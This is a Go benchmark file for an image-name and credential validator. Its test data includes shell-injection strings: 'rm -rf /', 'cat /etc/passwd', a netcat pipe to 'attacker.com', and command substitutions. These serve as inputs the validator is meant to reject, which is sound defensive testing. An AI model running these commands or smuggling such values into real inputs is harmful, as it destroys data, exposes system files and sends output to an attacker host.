// Copyright (c) 2025 Lazycat Apps
// Licensed under the MIT License. See LICENSE file in the project root for details.

package validator

import (
	"strings"
	"testing"
)

// BenchmarkValidateImageName measures the performance of image name validation
func BenchmarkValidateImageName(b *testing.B) {
	testCases := []string{
		"alpine:latest",
		"docker.io/library/nginx:1.21",
		"registry.example.com:5000/myapp:v1.0.0",
		"gcr.io/project-id/image@sha256:abcdef1234567890",
	}

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		ValidateImageName(testCases[i%len(testCases)])
	}
}

// BenchmarkValidateImageNameShort measures short image name validation
func BenchmarkValidateImageNameShort(b *testing.B) {
	imageName := "alpine:latest"

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		ValidateImageName(imageName)
	}
}

// BenchmarkValidateImageNameLong measures long image name validation
func BenchmarkValidateImageNameLong(b *testing.B) {
	imageName := "registry.example.com:5000/organization/project/subproject/image:v1.2.3-alpha.1+build.123"

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		ValidateImageName(imageName)
	}
}

// BenchmarkValidateImageNameInvalid measures invalid image name validation
func BenchmarkValidateImageNameInvalid(b *testing.B) {
	imageName := "invalid image; rm -rf /"

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		ValidateImageName(imageName)
	}
}

// BenchmarkValidateUsername measures username validation performance
func BenchmarkValidateUsername(b *testing.B) {
	username := "user@example.com"

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		ValidateUsername(username)
	}
}

// BenchmarkValidatePassword measures password validation performance
func BenchmarkValidatePassword(b *testing.B) {
	password := "SecureP@ssw0rd!2024"

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		ValidatePassword(password)
	}
}

// BenchmarkValidateCredentials measures combined credential validation
func BenchmarkValidateCredentials(b *testing.B) {
	username := "user@example.com"
	password := "SecureP@ssw0rd!2024"

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		ValidateCredentials(username, password)
	}
}

// BenchmarkValidateConfigName measures config name validation
func BenchmarkValidateConfigName(b *testing.B) {
	configName := "my-config_v1.2.3"

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		ValidateConfigName(configName)
	}
}

// BenchmarkValidateImageNameWithInjection measures injection attack detection
func BenchmarkValidateImageNameWithInjection(b *testing.B) {
	// Common injection patterns
	injections := []string{
		"alpine:latest; echo pwned",
		"nginx:latest && cat /etc/passwd",
		"image:tag | nc attacker.com 1234",
		"image:tag `whoami`",
		"image:tag $(id)",
	}

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		ValidateImageName(injections[i%len(injections)])
	}
}

// BenchmarkValidateImageNameMaxLength measures max length validation
func BenchmarkValidateImageNameMaxLength(b *testing.B) {
	// Generate a 512 character image name (max allowed)
	imageName := "registry.example.com/" + strings.Repeat("a", 490) + ":tag"

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		ValidateImageName(imageName)
	}
}

// BenchmarkValidateImageNameOverMaxLength measures over max length validation
func BenchmarkValidateImageNameOverMaxLength(b *testing.B) {
	// Generate a 513 character image name (over max)
	imageName := "registry.example.com/" + strings.Repeat("a", 491) + ":tag"

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		ValidateImageName(imageName)
	}
}

// BenchmarkValidateSHA256Digest measures SHA256 digest validation
func BenchmarkValidateSHA256Digest(b *testing.B) {
	imageName := "alpine@sha256:1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef"

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		ValidateImageName(imageName)
	}
}

// BenchmarkValidateConcurrent measures concurrent validation performance
func BenchmarkValidateConcurrent(b *testing.B) {
	testImages := []string{
		"alpine:latest",
		"nginx:1.21",
		"redis:6.2",
		"postgres:13",
		"mysql:8.0",
	}

	b.ResetTimer()
	b.RunParallel(func(pb *testing.PB) {
		i := 0
		for pb.Next() {
			ValidateImageName(testImages[i%len(testImages)])
			i++
		}
	})
}
